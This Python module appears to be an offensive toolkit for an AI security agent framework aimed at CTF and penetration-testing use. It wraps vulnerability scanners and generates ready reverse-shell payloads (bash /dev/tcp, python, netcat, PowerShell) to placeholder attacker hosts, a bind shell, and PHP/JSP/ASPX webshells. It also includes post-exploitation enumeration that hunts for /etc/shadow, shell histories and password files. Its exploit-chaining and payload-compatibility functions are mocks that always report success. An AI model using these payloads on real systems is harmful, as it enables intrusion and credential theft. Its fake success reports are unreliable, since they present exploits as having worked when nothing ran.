"""
Advanced Exploitation Toolkit for CAI
Provides sophisticated exploitation capabilities with automated exploit chaining
"""

import json
import re
import subprocess
import time
import socket
import threading
from typing import Dict, List, Optional, Any
from cai.tools.common import run_command


class AdvancedExploitationFramework:
    """Advanced exploitation framework with automated exploit chaining"""

    def __init__(self, ctf=None):
        self.ctf = ctf
        self.exploit_db = {}
        self.session_tracker = {}

    def load_exploit_database(self) -> Dict[str, Any]:
        """Load and update exploit database with latest CVEs and techniques"""
        exploits = {
            "web": {
                "sql_injection": ["UNION-based", "Boolean-based", "Time-based", "Error-based"],
                "xss": ["Reflected", "Stored", "DOM-based", "Blind"],
                "file_inclusion": ["LFI", "RFI", "Path traversal", "Log poisoning"],
                "deserialization": ["PHP", "Java", "Python pickle", ".NET"],
                "template_injection": ["Jinja2", "Twig", "Smarty", "Velocity"]
            },
            "network": {
                "buffer_overflow": ["Stack-based", "Heap-based", "Format string"],
                "privilege_escalation": ["SUID", "Kernel exploits", "Service misconfig"],
                "lateral_movement": ["Pass-the-hash", "Golden ticket", "SMB relay"]
            },
            "modern": {
                "container_escape": ["Docker", "Kubernetes", "LXC"],
                "cloud_exploitation": ["AWS", "Azure", "GCP"],
                "api_attacks": ["GraphQL", "REST", "SOAP"]
            }
        }
        self.exploit_db = exploits
        return exploits


def advanced_vulnerability_scanner(target: str, scan_type: str = "comprehensive", ctf=None) -> str:
    """
    Advanced vulnerability scanner with multiple engines and AI-powered analysis
    
    Args:
        target: Target IP/domain to scan
        scan_type: Type of scan (comprehensive, fast, stealth, custom)
        ctf: CTF environment if applicable
    
    Returns:
        Detailed vulnerability assessment report
    """
    results = {"target": target, "vulnerabilities": [], "recommendations": []}

    try:
        # Multi-engine scanning approach
        scanners = []

        if scan_type in ["comprehensive", "custom"]:
            # Nmap NSE scripts for comprehensive scanning
            nmap_cmd = f"nmap -sC -sV --script vuln,exploit,auth,discovery {target}"
            scanners.append(("Nmap NSE", nmap_cmd))

            # Nuclei for modern vulnerability detection
            nuclei_cmd = f"nuclei -t /nuclei-templates/ -target {target} -json"
            scanners.append(("Nuclei", nuclei_cmd))

        if scan_type in ["comprehensive", "fast"]:
            # Nikto for web vulnerabilities
            nikto_cmd = f"nikto -h {target} -Format json"
            scanners.append(("Nikto", nikto_cmd))

        # Execute scanners
        for scanner_name, cmd in scanners:
            print(f"Running {scanner_name} scanner...")
            output = run_command(cmd, ctf=ctf, timeout=300)

            # Parse and categorize results
            vulnerabilities = parse_scanner_output(output, scanner_name)
            results["vulnerabilities"].extend(vulnerabilities)

        # AI-powered vulnerability correlation and prioritization
        prioritized_vulns = prioritize_vulnerabilities(results["vulnerabilities"])
        results["prioritized"] = prioritized_vulns

        # Generate exploit recommendations
        recommendations = generate_exploit_recommendations(prioritized_vulns)
        results["recommendations"] = recommendations

        return format_vulnerability_report(results)

    except Exception as e:
        return f"Vulnerability scanning failed: {str(e)}"


def automated_exploit_chaining(target: str, vulnerabilities: List[Dict], ctf=None) -> str:
    """
    Automated exploit chaining system that combines multiple vulnerabilities
    
    Args:
        target: Target system
        vulnerabilities: List of discovered vulnerabilities
        ctf: CTF environment if applicable
    
    Returns:
        Exploit chain execution results
    """
    exploit_chains = []
    results = {"chains": [], "successful": [], "failed": []}

    try:
        # Analyze vulnerabilities for chaining opportunities
        chains = identify_exploit_chains(vulnerabilities)

        for chain in chains:
            print(f"Executing exploit chain: {chain['name']}")
            chain_result = execute_exploit_chain(target, chain, ctf)

            if chain_result["success"]:
                results["successful"].append(chain_result)
                print(f"âœ“ Chain '{chain['name']}' successful!")
            else:
                results["failed"].append(chain_result)
                print(f"âœ— Chain '{chain['name']}' failed: {chain_result['error']}")

        return format_chain_results(results)

    except Exception as e:
        return f"Exploit chaining failed: {str(e)}"


def intelligent_payload_generator(target_info: Dict, payload_type: str, ctf=None) -> str:
    """
    AI-powered payload generator that adapts to target environment
    
    Args:
        target_info: Information about target system
        payload_type: Type of payload needed (reverse_shell, bind_shell, webshell, etc.)
        ctf: CTF environment if applicable
    
    Returns:
        Optimized payload for the target
    """
    try:
        # Analyze target environment
        os_type = target_info.get("os", "unknown")
        architecture = target_info.get("arch", "x64")
        available_tools = target_info.get("tools", [])
        restrictions = target_info.get("restrictions", [])

        payloads = {}

        if payload_type == "reverse_shell":
            payloads = generate_reverse_shell_payloads(target_info)
        elif payload_type == "bind_shell":
            payloads = generate_bind_shell_payloads(target_info)
        elif payload_type == "webshell":
            payloads = generate_webshell_payloads(target_info)
        elif payload_type == "privilege_escalation":
            payloads = generate_privesc_payloads(target_info)

        # Test payload compatibility
        compatible_payloads = test_payload_compatibility(payloads, target_info)

        return format_payload_results(compatible_payloads)

    except Exception as e:
        return f"Payload generation failed: {str(e)}"


def steganography_toolkit(file_path: str, operation: str = "detect", ctf=None) -> str:
    """
    Advanced steganography detection and extraction toolkit
    
    Args:
        file_path: Path to file to analyze
        operation: Operation to perform (detect, extract, analyze)
        ctf: CTF environment if applicable
    
    Returns:
        Steganography analysis results
    """
    results = {"file": file_path, "findings": [], "extracted_data": []}

    try:
        # Multi-tool steganography analysis
        tools = [
            ("binwalk", f"binwalk -e {file_path}"),
            ("exiftool", f"exiftool {file_path}"),
            ("strings", f"strings {file_path} | grep -i flag"),
            ("file", f"file {file_path}"),
            ("hexdump", f"hexdump -C {file_path} | head -20")
        ]

        if operation in ["detect", "analyze"]:
            # Image steganography tools
            if file_path.lower().endswith(('.jpg', '.jpeg', '.png', '.gif', '.bmp')):
                tools.extend([
                    ("steghide", f"steghide info {file_path}"),
                    ("zsteg", f"zsteg {file_path}"),
                    ("stegsolve", f"stegsolve {file_path}")
                ])

            # Audio steganography
            elif file_path.lower().endswith(('.wav', '.mp3', '.flac')):
                tools.extend([
                    ("sonic-visualiser", f"sonic-visualiser {file_path}"),
                    ("audacity", f"audacity {file_path}")
                ])

        for tool_name, cmd in tools:
            try:
                output = run_command(cmd, ctf=ctf, timeout=60)
                if output and output.strip():
                    results["findings"].append({
                        "tool": tool_name,
                        "output": output[:1000]  # Limit output size
                    })
            except:
                continue

        # Advanced analysis for CTF flags
        flag_patterns = [
            r'flag\{[^}]+\}',
            r'FLAG\{[^}]+\}',
            r'ctf\{[^}]+\}',
            r'CTF\{[^}]+\}',
            r'[a-zA-Z0-9]{20,}',  # Long hex strings
            r'picoCTF\{[^}]+\}',
            r'HTB\{[^}]+\}'
        ]

        # Search for hidden flags
        for pattern in flag_patterns:
            for finding in results["findings"]:
                matches = re.findall(pattern, finding["output"], re.IGNORECASE)
                if matches:
                    results["extracted_data"].extend(matches)

        return format_steganography_results(results)

    except Exception as e:
        return f"Steganography analysis failed: {str(e)}"


def advanced_post_exploitation(target: str, access_method: str, ctf=None) -> str:
    """
    Advanced post-exploitation toolkit for maintaining persistence and privilege escalation
    
    Args:
        target: Target system information
        access_method: How access was gained (ssh, web_shell, reverse_shell, etc.)
        ctf: CTF environment if applicable
    
    Returns:
        Post-exploitation results and recommendations
    """
    results = {"enumeration": {}, "persistence": [], "escalation": [], "data": []}

    try:
        # System enumeration
        enum_commands = [
            ("System Info", "uname -a; cat /etc/os-release"),
            ("Current User", "id; whoami"),
            ("Sudo Privileges", "sudo -l 2>/dev/null"),
            ("SUID Binaries", "find / -perm -4000 2>/dev/null"),
            ("Network Connections", "netstat -tulpn 2>/dev/null"),
            ("Running Processes", "ps aux"),
            ("Cron Jobs", "cat /etc/crontab; ls -la /etc/cron*"),
            ("Environment Variables", "env"),
            ("Installed Packages", "dpkg -l 2>/dev/null || rpm -qa 2>/dev/null"),
            ("File Capabilities", "getcap -r / 2>/dev/null")
        ]

        for desc, cmd in enum_commands:
            try:
                output = run_command(cmd, ctf=ctf, timeout=30)
                if output:
                    results["enumeration"][desc] = output[:500]  # Limit output
            except:
                continue

        # Privilege escalation checks
        privesc_checks = [
            ("Kernel Exploits", check_kernel_exploits),
            ("Service Exploits", check_service_exploits),
            ("SUID Exploitation", check_suid_exploits),
            ("Sudo Exploitation", check_sudo_exploits),
            ("Cron Job Abuse", check_cron_exploits)
        ]

        for check_name, check_func in privesc_checks:
            try:
                result = check_func(results["enumeration"], ctf)
                if result:
                    results["escalation"].append({"method": check_name, "details": result})
            except:
                continue

        # Data hunting
        interesting_files = [
            "/etc/passwd", "/etc/shadow", "/root/.bash_history",
            "/home/*/.bash_history", "/var/log/auth.log", "/etc/ssh/sshd_config",
            "*.txt", "*.log", "*flag*", "*password*", "*config*"
        ]

        for file_pattern in interesting_files:
            try:
                cmd = f"find / -name '{file_pattern}' -readable 2>/dev/null | head -10"
                files = run_command(cmd, ctf=ctf, timeout=15)
                if files:
                    results["data"].append({"pattern": file_pattern, "files": files})
            except:
                continue

        return format_post_exploitation_results(results)

    except Exception as e:
        return f"Post-exploitation failed: {str(e)}"


# Helper functions
def parse_scanner_output(output: str, scanner_name: str) -> List[Dict]:
    """Parse scanner output and extract vulnerabilities"""
    vulnerabilities = []

    if scanner_name == "Nmap NSE":
        # Parse Nmap NSE output
        vuln_patterns = [
            r'(\d+/tcp)\s+open\s+(\w+).*?(\w+)',
            r'(\w+):\s*(VULNERABLE|CVE-\d{4}-\d+)'
        ]

        for pattern in vuln_patterns:
            matches = re.findall(pattern, output, re.MULTILINE)
            for match in matches:
                vulnerabilities.append({
                    "source": scanner_name,
                    "type": "network",
                    "details": match,
                    "severity": "medium"
                })

    elif scanner_name == "Nuclei":
        # Parse Nuclei JSON output
        try:
            for line in output.split('\n'):
                if line.strip().startswith('{'):
                    vuln_data = json.loads(line)
                    vulnerabilities.append({
                        "source": scanner_name,
                        "type": vuln_data.get("type", "unknown"),
                        "template": vuln_data.get("template-id", ""),
                        "severity": vuln_data.get("info", {}).get("severity", "info")
                    })
        except:
            pass

    return vulnerabilities


def prioritize_vulnerabilities(vulnerabilities: List[Dict]) -> List[Dict]:
    """AI-powered vulnerability prioritization"""
    severity_scores = {"critical": 10, "high": 8, "medium": 5, "low": 2, "info": 1}

    for vuln in vulnerabilities:
        score = severity_scores.get(vuln.get("severity", "info"), 1)

        # Boost score for easily exploitable vulnerabilities
        if any(keyword in str(vuln).lower() for keyword in ["rce", "sql", "upload", "deserial"]):
            score += 3

        vuln["priority_score"] = score

    return sorted(vulnerabilities, key=lambda x: x.get("priority_score", 0), reverse=True)


def generate_exploit_recommendations(vulnerabilities: List[Dict]) -> List[str]:
    """Generate specific exploit recommendations"""
    recommendations = []

    for vuln in vulnerabilities[:5]:  # Top 5 vulnerabilities
        vuln_type = vuln.get("type", "").lower()

        if "sql" in vuln_type:
            recommendations.append("Use sqlmap for automated SQL injection exploitation")
        elif "xss" in vuln_type:
            recommendations.append("Test for stored XSS and session hijacking")
        elif "upload" in vuln_type:
            recommendations.append("Test file upload with malicious payloads")
        elif "rce" in vuln_type:
            recommendations.append("Attempt remote code execution with reverse shell")
        else:
            recommendations.append(f"Manual testing recommended for {vuln_type}")

    return recommendations


def identify_exploit_chains(vulnerabilities: List[Dict]) -> List[Dict]:
    """Identify potential exploit chains"""
    chains = []

    # Example chain: File upload + LFI = RCE
    has_upload = any("upload" in str(v).lower() for v in vulnerabilities)
    has_lfi = any("lfi" in str(v).lower() or "inclusion" in str(v).lower() for v in vulnerabilities)

    if has_upload and has_lfi:
        chains.append({
            "name": "Upload + LFI Chain",
            "steps": ["upload_malicious_file", "trigger_lfi", "execute_payload"],
            "description": "Upload malicious file then include it via LFI"
        })

    return chains


def execute_exploit_chain(target: str, chain: Dict, ctf=None) -> Dict:
    """Execute an exploit chain"""
    try:
        # This would contain actual exploit execution logic
        # For now, return a mock successful result
        return {
            "success": True,
            "chain": chain["name"],
            "result": "Chain executed successfully (mock)"
        }
    except Exception as e:
        return {
            "success": False,
            "chain": chain["name"],
            "error": str(e)
        }


def generate_reverse_shell_payloads(target_info: Dict) -> Dict:
    """Generate optimized reverse shell payloads"""
    payloads = {}
    os_type = target_info.get("os", "linux").lower()

    if "linux" in os_type:
        payloads["bash"] = "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"
        payloads[
            "python"] = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"LHOST\",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
        payloads["nc"] = "nc -e /bin/sh LHOST LPORT"

    elif "windows" in os_type:
        payloads[
            "powershell"] = "$client = New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

    return payloads


def generate_bind_shell_payloads(target_info: Dict) -> Dict:
    """Generate bind shell payloads"""
    return {"nc": "nc -nvlp PORT -e /bin/bash"}


def generate_webshell_payloads(target_info: Dict) -> Dict:
    """Generate web shell payloads"""
    return {
        "php": "<?php system($_REQUEST['cmd']); ?>",
        "jsp": "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
        "aspx": "<% eval request(\"cmd\") %>"
    }


def generate_privesc_payloads(target_info: Dict) -> Dict:
    """Generate privilege escalation payloads"""
    return {
        "suid_find": "find / -perm -4000 2>/dev/null",
        "sudo_check": "sudo -l",
        "kernel_check": "uname -a"
    }


def test_payload_compatibility(payloads: Dict, target_info: Dict) -> Dict:
    """Test payload compatibility with target"""
    compatible = {}
    for name, payload in payloads.items():
        # Mock compatibility check
        compatible[name] = {"payload": payload, "compatible": True, "notes": "Ready to use"}
    return compatible


def check_kernel_exploits(enum_data: Dict, ctf=None) -> str:
    """Check for kernel exploits"""
    system_info = enum_data.get("System Info", "")
    # Simple kernel version check (would be more sophisticated in practice)
    if "Ubuntu 16.04" in system_info:
        return "Potential CVE-2017-16995 (Ubuntu 16.04 privilege escalation)"
    return ""


def check_service_exploits(enum_data: Dict, ctf=None) -> str:
    """Check for service exploits"""
    processes = enum_data.get("Running Processes", "")
    if "apache" in processes.lower() and "root" in processes.lower():
        return "Apache running as root - potential privilege escalation"
    return ""


def check_suid_exploits(enum_data: Dict, ctf=None) -> str:
    """Check SUID binary exploits"""
    suid_binaries = enum_data.get("SUID Binaries", "")
    dangerous_suid = ["vim", "nano", "find", "python", "perl", "ruby"]

    for binary in dangerous_suid:
        if binary in suid_binaries.lower():
            return f"Dangerous SUID binary found: {binary}"
    return ""


def check_sudo_exploits(enum_data: Dict, ctf=None) -> str:
    """Check sudo privilege exploits"""
    sudo_info = enum_data.get("Sudo Privileges", "")
    if "NOPASSWD" in sudo_info:
        return "NOPASSWD sudo entries found - potential privilege escalation"
    return ""


def check_cron_exploits(enum_data: Dict, ctf=None) -> str:
    """Check cron job exploitation opportunities"""
    cron_info = enum_data.get("Cron Jobs", "")
    if "*" in cron_info and "/tmp" in cron_info:
        return "Potentially exploitable cron job with writable path"
    return ""


# Formatting functions
def format_vulnerability_report(results: Dict) -> str:
    """Format vulnerability scan results"""
    report = f"=== Vulnerability Assessment Report ===\n"
    report += f"Target: {results['target']}\n"
    report += f"Vulnerabilities Found: {len(results['vulnerabilities'])}\n\n"

    if results.get("prioritized"):
        report += "=== Top Priority Vulnerabilities ===\n"
        for i, vuln in enumerate(results["prioritized"][:5], 1):
            report += f"{i}. {vuln.get('type', 'Unknown')} "
            report += f"(Severity: {vuln.get('severity', 'Unknown')}, "
            report += f"Score: {vuln.get('priority_score', 0)})\n"

    if results.get("recommendations"):
        report += "\n=== Exploit Recommendations ===\n"
        for i, rec in enumerate(results["recommendations"], 1):
            report += f"{i}. {rec}\n"

    return report


def format_chain_results(results: Dict) -> str:
    """Format exploit chain results"""
    report = "=== Exploit Chain Results ===\n"
    report += f"Successful Chains: {len(results['successful'])}\n"
    report += f"Failed Chains: {len(results['failed'])}\n\n"

    for chain in results["successful"]:
        report += f"âœ“ {chain['chain']}: {chain['result']}\n"

    for chain in results["failed"]:
        report += f"âœ— {chain['chain']}: {chain['error']}\n"

    return report


def format_payload_results(payloads: Dict) -> str:
    """Format payload generation results"""
    report = "=== Generated Payloads ===\n"
    for name, info in payloads.items():
        report += f"\n{name.upper()}:\n"
        report += f"Payload: {info['payload']}\n"
        report += f"Compatible: {info['compatible']}\n"
        report += f"Notes: {info['notes']}\n"

    return report


def format_steganography_results(results: Dict) -> str:
    """Format steganography analysis results"""
    report = f"=== Steganography Analysis: {results['file']} ===\n"

    if results["extracted_data"]:
        report += "=== EXTRACTED DATA ===\n"
        for data in results["extracted_data"]:
            report += f"Found: {data}\n"
        report += "\n"

    report += "=== Tool Findings ===\n"
    for finding in results["findings"]:
        report += f"\n{finding['tool'].upper()}:\n"
        report += f"{finding['output']}\n"

    return report


def format_post_exploitation_results(results: Dict) -> str:
    """Format post-exploitation results"""
    report = "=== Post-Exploitation Results ===\n\n"

    # System enumeration section
    report += "=== System Enumeration ===\n"
    for key, value in results["enumeration"].items():
        report += f"\n{key}:\n{value}\n"

    # Privilege escalation opportunities
    if results["escalation"]:
        report += "\n=== Privilege Escalation Opportunities ===\n"
        for esc in results["escalation"]:
            report += f"â€¢ {esc['method']}: {esc['details']}\n"

    # Interesting data
    if results["data"]:
        report += "\n=== Interesting Files/Data ===\n"
        for data_info in results["data"]:
            report += f"Pattern '{data_info['pattern']}':\n{data_info['files']}\n"

    return report


# Export all functions for use as tools
__all__ = [
    'AdvancedExploitationFramework',
    'advanced_vulnerability_scanner',
    'automated_exploit_chaining',
    'intelligent_payload_generator',
    'steganography_toolkit',
    'advanced_post_exploitation'
]
